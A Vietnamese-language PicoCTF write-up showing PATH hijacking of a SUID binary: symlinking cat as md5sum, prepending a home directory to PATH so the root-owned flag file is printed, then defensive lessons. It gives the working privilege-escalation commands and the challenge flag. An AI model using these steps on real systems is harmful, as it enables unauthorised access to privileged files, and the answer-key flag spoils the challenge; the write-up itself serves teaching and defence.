# Write-up Khai thác lỗ hổng PATH Hijacking trên Binary SUID

## Thông tin Challenge
- Challenge thuộc PicoCTF
- Cần truy cập nội dung file `/root/flag.txt` không có quyền đọc trực tiếp

## Phân tích Lỗ hổng
Khi kiểm tra các file có SUID bit trong hệ thống, phát hiện binary `/usr/local/bin/flaghasher` có quyền SUID (chạy với quyền của owner là root):

```bash
find / -perm -4000 2>/dev/null
```

Binary này thực hiện lệnh MD5 hash file `/root/flag.txt` thông qua lệnh:
```
/bin/bash -c 'md5sum /root/flag.txt'
```

Lỗ hổng nằm ở việc chương trình gọi lệnh `md5sum` theo cách relative path (không chỉ định đường dẫn đầy đủ), khiến nó phải tìm trong biến môi trường PATH.

## Khai thác Step-by-Step

### 1. Tạo thư mục bin trong home directory
```bash
mkdir -p ~/bin
```

### 2. Tạo symbolic link từ md5sum tới cat
```bash
ln -s /bin/cat ~/bin/md5sum
```
Khi thấy thông báo lỗi `File exists`, có nghĩa link đã được tạo trước đó.

### 3. Thay đổi biến môi trường PATH
```bash
export PATH=~/bin:$PATH
```
Điều này khiến hệ thống tìm thư mục ~/bin trước khi tìm thư mục mặc định.

### 4. Kiểm tra lệnh md5sum đang trỏ tới đâu
```bash
which md5sum
```
Kết quả: `/home/ctf-player/bin/md5sum` - xác nhận khai thác thành công.

### 5. Chạy binary SUID
```bash
/usr/local/bin/flaghasher
```

### 6. Kết quả
Thay vì hiển thị MD5 hash như mặc định:
```
4268c8737000b13184189a06b5054d72  /root/flag.txt
```

Chương trình hiển thị nội dung của file flag:
```
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_1a74f5fd}
```

## Bài học về Bảo mật
1. Trong các chương trình có đặc quyền cao (SUID), luôn sử dụng đường dẫn tuyệt đối (absolute path) khi gọi các chương trình khác
2. Cẩn trọng khi sử dụng hàm `system()` trong các chương trình SUID
3. Nên sử dụng các hàm an toàn hơn như `execve()` không phụ thuộc vào shell interpretation
4. Cần sanitize môi trường (environment) trước khi thực thi các lệnh với quyền đặc biệt
5. Các binaries SUID nên được thiết kế với nguyên tắc "principle of least privilege"

Lỗ hổng PATH Hijacking là một kỹ thuật tấn công phổ biến đối với các chương trình SUID không sử dụng đường dẫn tuyệt đối khi gọi chương trình khác.